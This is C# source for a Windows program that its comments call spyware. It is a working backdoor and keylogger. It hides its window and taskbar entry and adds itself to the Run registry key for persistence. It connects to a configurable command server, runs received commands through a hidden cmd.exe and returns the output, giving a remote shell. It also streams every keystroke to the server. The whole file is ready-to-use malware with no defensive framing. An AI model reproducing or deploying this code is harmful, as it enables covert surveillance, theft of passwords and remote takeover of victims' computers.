using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace Cookie
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.Opacity = 0; // set invisible to the user
            this.ShowInTaskbar = false;
        }

        [DllImport("user32.dll")] // Dll for keylogger
        public static extern int GetAsyncKeyState(Int32 i);

        private void Form1_Load(object sender, EventArgs e)
        {

            // Autorun of the spyware
            RegistryKey AutoRun = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", true);
                                                                                                                        
            if (AutoRun.GetValue("winDir") == null)
            {
                AutoRun.SetValue("winDir", Application.ExecutablePath.ToString());
            }

            // TCP SOCKET for connecting to the server
            TcpClient cookie =new TcpClient();

            int try_connect = 1;

            // this do while wait for server
            do
            {
                try                 // ********************   //
                {                  //   Change Ip and Port   //
                                  //   ******************** //
                    cookie.Connect("127.0.0.1", 7373);
                    try_connect = 0;
                }
                catch
                {
                    try_connect = 1;
                    Thread.Sleep(5000);
                }
            }
            while (try_connect == 1);

            try
            {
                NetworkStream stream = cookie.GetStream();

                // "cookie" is the OK message -- like 0 errors
                int len = Encoding.ASCII.GetByteCount("cookie");
                byte[] msg = new byte[len];
                msg = Encoding.ASCII.GetBytes("cookie");

                string com;
                byte[] recv;
                byte[] inv;

                // CMD
                System.Diagnostics.Process cmd = new System.Diagnostics.Process();
                System.Diagnostics.ProcessStartInfo ex = new System.Diagnostics.ProcessStartInfo();
                ex.RedirectStandardOutput = true;
                ex.UseShellExecute = false;
                ex.CreateNoWindow = true;
                ex.FileName = "cmd.exe";

                KeysConverter converter = new KeysConverter();
                int st = 0, red;
                do
                {
                    recv = new byte[cookie.ReceiveBufferSize];
                    stream.Write(msg, 0, msg.Length); // here we receive the command
                    red = stream.Read(recv, 0, (int)cookie.ReceiveBufferSize);
                    com = Encoding.ASCII.GetString(recv, 0, red);
                    if (com.Equals("close"))
                        st = 1; // and here we close the do while loop
                    else if (com.Equals("key")) // if the command is key
                    {                          // switch mode to KeyLogger
                        int key;
                        while (true)
                        {
                            Thread.Sleep(10); // here we read the key
                            for (Int32 i = 32; i < 126; i++)
                            {

                                key = GetAsyncKeyState(i); // reading just letters key
                                if (key == 1 || key == -32767)
                                {
                                    com = ((char)i).ToString();
                                    len = Encoding.ASCII.GetByteCount(com);
                                    inv = new byte[len];
                                    inv = Encoding.ASCII.GetBytes(com);
                                    stream.Write(inv, 0, inv.Length);
                                    // sending the key pressed

                                    recv = new byte[cookie.ReceiveBufferSize];
                                    red = stream.Read(recv, 0, recv.Length);
                                    com = Encoding.ASCII.GetString(recv, 0, red);
                                    if (com.Equals("esc"))
                                        break;
                                }
                            }
                            if (com.Equals("esc"))
                                break;
                        }
                    }
                    else
                    {  // else i execute the command
                        ex.Arguments = "/C" + com;
                        cmd.StartInfo = ex;
                        cmd.Start();
                        com = cmd.StandardOutput.ReadToEnd();
                        if (com.Length < 2)
                            stream.Write(msg, 0, msg.Length);
                        else
                        {
                            len = Encoding.ASCII.GetByteCount(com);
                            inv = new byte[len];
                            inv = Encoding.ASCII.GetBytes(com);
                            stream.Write(inv, 0, inv.Length);
                        }

                    }
                } while (st == 0);
                stream.Close();
                cookie.Close();
            }
            catch
            {
                this.Close();
                return;
            }
            
        }
    }
}
